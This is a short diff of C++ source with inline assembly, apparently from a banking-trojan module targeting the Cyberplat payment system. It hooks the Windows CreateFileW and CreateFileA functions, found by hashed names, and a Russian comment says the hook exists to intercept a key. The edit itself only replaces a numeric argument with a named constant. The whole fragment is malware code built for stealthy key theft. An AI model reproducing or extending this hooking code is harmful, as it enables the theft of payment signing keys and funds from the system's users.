@@ -134,11 +134,11 @@ namespace Cyberplat
 		if( Real_CreateFileW == 0 )
 		{
 	        // Для перехвата ключа ставим хук на открытие файла
-			if (HookApi(1, Hash_CreateFileW, &Hook_CreateFileW) )
+			if (HookApi(DLL_KERNEL32, Hash_CreateFileW, &Hook_CreateFileW) )
 			{
 				__asm mov [Real_CreateFileW], eax
 			}
-			if (HookApi(1, Hash_CreateFileA, &Hook_CreateFileA) )
+			if (HookApi(DLL_KERNEL32, Hash_CreateFileA, &Hook_CreateFileA) )
 			{
 				__asm mov [Real_CreateFileA], eax
 			}
